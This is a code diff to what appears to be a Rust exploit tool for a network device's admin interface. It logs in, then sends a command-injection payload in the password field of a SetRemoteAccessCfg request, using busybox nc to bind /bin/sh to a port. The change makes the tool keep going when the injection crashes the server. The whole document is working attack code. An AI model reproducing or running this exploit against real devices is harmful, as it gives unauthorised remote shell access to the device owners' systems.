@@ -107,7 +107,7 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
     }
 
     // Step 4: Exploit using authenticated session
-    let response: ExploitResponse = client
+    let exploit_result = client
         .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
         .header("Content-Type", "application/json")
         .header("Cookie", authenticated_cookie)
@@ -116,14 +116,27 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
             r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
         ))
         .send()
-        .await
-        .context("failed to start telnet")?
-        .json()
-        .await
-        .context("failed to start telnet")?;
+        .await;
 
-    if response.retcode != 0 {
-        bail!("unexpected response while starting telnet: {:?}", response);
+    match exploit_result {
+        Ok(resp) => {
+            // Try to parse response but don't fail if the server closed the connection
+            match resp.json::<ExploitResponse>().await {
+                Ok(response) if response.retcode != 0 => {
+                    bail!("unexpected response while starting telnet: {:?}", response);
+                }
+                Ok(_) => {}
+                Err(_) => {
+                    // Server likely crashed from the injection which is expected
+                }
+            }
+        }
+        Err(e) if e.is_connect() => {
+            bail!("failed to connect to admin interface at {admin_ip}: {e}");
+        }
+        Err(e) => {
+            eprintln!("exploit request failed ({e}), continuing anyway");
+        }
     }
 
     Ok(())
